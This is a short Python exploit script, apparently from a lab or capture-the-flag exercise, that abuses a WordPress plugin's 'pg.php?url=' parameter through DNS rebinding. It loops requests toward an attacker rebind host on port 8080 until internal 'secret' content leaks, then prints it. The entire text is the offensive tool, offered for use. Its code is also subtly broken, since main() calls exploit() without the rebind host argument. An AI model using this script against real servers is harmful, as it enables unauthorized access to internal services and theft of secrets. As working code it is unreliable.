import requests
import argparse

def exploit(target_host, rebind_host):
	loop = True

	while loop:
		r = requests.get(f'{target_host}/wp-content/plugins/custom-plugin/pg.php?url={rebind_host}:8080')

		if "secret" in r.text:
			loop = False
			print("DNS rebinding successful")
			print(r.text)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', help='Target URL to set', required=True)
    parser.add_argument('-r','--rebind-host', help='Rebind Host to target', required=True)
    args = parser.parse_args()
    
    exploit(args.target)
    print("[+] Attack completed")

if __name__ == "__main__":
    main()